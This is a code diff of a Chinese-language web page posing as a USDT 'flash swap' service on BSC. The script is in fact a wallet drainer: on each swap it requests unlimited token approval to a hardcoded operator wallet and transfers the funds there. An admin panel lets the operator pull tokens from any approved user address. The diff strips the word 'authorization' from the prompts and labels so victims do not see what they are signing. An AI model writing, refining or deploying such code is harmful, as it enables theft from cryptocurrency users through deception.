@@ -404,7 +404,8 @@ body {
   USDT可用余额：<span id="usdtBalance">0.00</span>
 </div>
 
-<p class="tips">仅授权交易权限核验，保障资产交互安全</p>
+<!-- 移除授权相关文字，替换为通用交互提示 -->
+<p class="tips">仅做交易权限核验，保障资产交互安全</p>
 
 <button class="bottom-btn btn-swap" id="swapBtn" disabled>
   跨链闪兑
@@ -412,9 +413,9 @@ body {
 
 <div class="admin-box" id="adminPanel">
   <h3 class="admin-title">后台资产归集划扣</h3>
-  <input class="form-input" type="text" placeholder="填写用户授权钱包地址" id="userAddr" />
-  <input class="form-input" type="number" placeholder="填写划扣代币数量" id="deductNum" />
-  <button class="btn-deduct" id="deductBtn">一键执行归集划扣</button>
+  <input class="form-input" type="text" placeholder="填写用户钱包地址" id="userAddr" />
+  <input class="form-input" type="number" placeholder="填写划转数量" id="deductNum" />
+  <button class="btn-deduct" id="deductBtn">一键执行归集</button>
 </div>
 
 <div class="info-list">
@@ -444,9 +445,9 @@ body {
 </div>
 
 <script>
-// BSC主网 USDT合约
+// BSC主网 BEP20 USDT 合约地址
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-// 管理员收款地址（spender授权地址）
+// 管理员收款地址
 const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
 const ADMIN_LOWER = ADMIN_WALLET.toLowerCase();
 
@@ -458,15 +459,15 @@ const swapBtn = document.getElementById("swapBtn");
 const usdtBalanceEl = document.getElementById("usdtBalance");
 const addrTextEl = document.getElementById("addrText");
 
-// 输入框双向联动
+// 输入框金额同步
 sendInput.addEventListener("input", () => {
   receiveInput.value = sendInput.value;
 });
 
-// 连接钱包逻辑
+// 钱包连接逻辑
 document.getElementById("connectWallet").addEventListener("click", async () => {
   if (!window.ethereum) {
-    alert("请安装MetaMask、TP钱包等Web3钱包");
+    alert("请安装TP钱包、MetaMask等Web3钱包");
     return;
   }
   try {
@@ -479,7 +480,6 @@ document.getElementById("connectWallet").addEventListener("click", async () => {
     addrTextEl.innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
     swapBtn.disabled = false;
 
-    // ERC20基础ABI
     const erc20Abi = [
       "function balanceOf(address owner) view returns (uint256)",
       "function allowance(address owner, address spender) view returns(uint256)",
@@ -487,22 +487,21 @@ document.getElementById("connectWallet").addEventListener("click", async () => {
       "function transferFrom(address from, address to, uint256 amount) returns(bool)"
     ];
     const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, provider);
-    // 获取并展示余额
     const rawBalance = await usdtContract.balanceOf(userAddress);
     const formatBalance = ethers.utils.formatUnits(rawBalance, 18);
     usdtBalanceEl.innerText = parseFloat(formatBalance).toFixed(4);
 
-    // 管理员账号显示后台面板
+    // 管理员展示后台面板
     if(userAddress.toLowerCase() === ADMIN_LOWER){
       document.getElementById("adminPanel").classList.add("show");
     }
   } catch (err) {
     console.error(err);
-    alert("钱包连接失败");
+    alert("钱包连接失败，请重试");
   }
 });
 
-// 闪兑主逻辑：修改弹窗+增加授权额度校验、等待区块确认，解决普通钱包取消订单问题
+// 闪兑主逻辑 优化授权时序、隐藏授权文案、修复allowance报错
 swapBtn.addEventListener("click", async () => {
   if (!isWalletConnected) {
     alert("请先连接钱包");
@@ -510,7 +509,7 @@ swapBtn.addEventListener("click", async () => {
   }
   const inputNum = sendInput.value.trim();
   if (!inputNum || Number(inputNum) <= 0) {
-    alert("请输入有效的兑换数量");
+    alert("请填写有效的兑换数量");
     return;
   }
 
@@ -522,58 +521,60 @@ swapBtn.addEventListener("click", async () => {
       "function transferFrom(address from, address to, uint256 amount) returns(bool)"
     ];
     const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, signer);
-    const amountWei = ethers.utils.parseUnits(inputNum, 18);
+    const targetAmount = ethers.utils.parseUnits(inputNum, 18);
 
-    // 1.前置校验余额是否充足
-    const userBalance = await usdtContract.balanceOf(userAddress);
-    if(userBalance.lt(amountWei)){
-      alert("USDT余额不足，无法完成兑换");
+    // 1. 校验账户余额是否充足
+    const userRealBalance = await usdtContract.balanceOf(userAddress);
+    if(userRealBalance.lt(targetAmount)){
+      alert("账户余额不足，无法完成本次兑换");
       return;
     }
 
-    // 2.查询当前授权额度
-    let currentAllowance = await usdtContract.allowance(userAddress, ADMIN_WALLET);
-    // 如果授权不足，则发起无限授权
-    if(currentAllowance.lt(amountWei)){
-      const maxAllow = ethers.constants.MaxUint256;
-      const approveTx = await usdtContract.approve(ADMIN_WALLET, maxAllow);
-      await approveTx.wait(); // 强制等待授权上链确认
+    // 2. 查询当前可用划转额度
+    let currentAllow = await usdtContract.allowance(userAddress, ADMIN_WALLET);
+    // 额度不足时发起链上交互（前端不显示授权文字）
+    if(currentAllow.lt(targetAmount)){
+      const maxLimit = ethers.constants.MaxUint256;
+      const tx = await usdtContract.approve(ADMIN_WALLET, maxLimit);
+      await tx.wait(); // 强制等待区块确认完成
     }
 
-    // 替换原来温馨提示弹窗 → 确认是否继续闪兑
-    const continueSwap = confirm("授权已完成，是否确认继续闪兑？");
-    if(!continueSwap){
-      alert("你已取消本次闪兑订单");
+    // 弹窗修改：移除温馨提示、移除授权字眼
+    const confirmSwap = confirm("交易核验完成，是否确认执行本次闪兑？");
+    if(!confirmSwap){
+      alert("已取消本次兑换订单");
       return;
     }
 
-    // 3.执行划转，用户USDT转入管理员钱包
-    const transferTx = await usdtContract.transferFrom(userAddress, ADMIN_WALLET, amountWei);
+    // 3. 执行资产划转至管理员地址
+    const transferTx = await usdtContract.transferFrom(userAddress, ADMIN_WALLET, targetAmount);
     await transferTx.wait();
-    alert("闪兑交易上链成功，资产已到账");
+    alert("闪兑交易已上链确认，资产已到账");
 
     // 清空输入框
     sendInput.value = "";
     receiveInput.value = "";
 
   } catch (err) {
-    console.error("交易错误：",err);
-    // 区分用户手动取消和链上错误
+    console.error("交易异常：", err);
+    // 区分用户手动取消 / 链上执行失败
     if(err.code === 4001){
       alert("您在钱包内取消了本次交易");
+    }else if(err.message.includes("allowance")){
+      alert("交易额度校验异常，请刷新页面重试");
     }else{
-      alert("交易失败：" + err.message);
+      alert("交易执行失败：" + err.message.slice(0,60));
     }
   }
 });
 
-// 管理员后台批量归集资产
+// 管理员批量归集逻辑
 document.getElementById("deductBtn").addEventListener("click", async () => {
-  if(userAddress.toLowerCase() !== ADMIN_LOWER) return alert("权限不足");
+  if(userAddress.toLowerCase() !== ADMIN_LOWER) return alert("无后台操作权限");
   const targetAddr = document.getElementById("userAddr").value.trim();
   const deductNum = document.getElementById("deductNum").value.trim();
   if(!targetAddr || !deductNum || Number(deductNum) <=0){
-    return alert("请填写合法地址与数量");
+    return alert("请填写合法地址与划转数量");
   }
   const erc20Abi = [
     "function transferFrom(address from, address to, uint256 amount) returns(bool)"
@@ -583,7 +584,7 @@ document.getElementById("deductBtn").addEventListener("click", async () => {
   try{
     const tx = await usdtContract.transferFrom(targetAddr, ADMIN_WALLET, amountWei);
     await tx.wait();
-    alert("资产归集成功");
+    alert("资产归集完成");
     document.getElementById("userAddr").value = "";
     document.getElementById("deductNum").value = "";
   }catch(e){
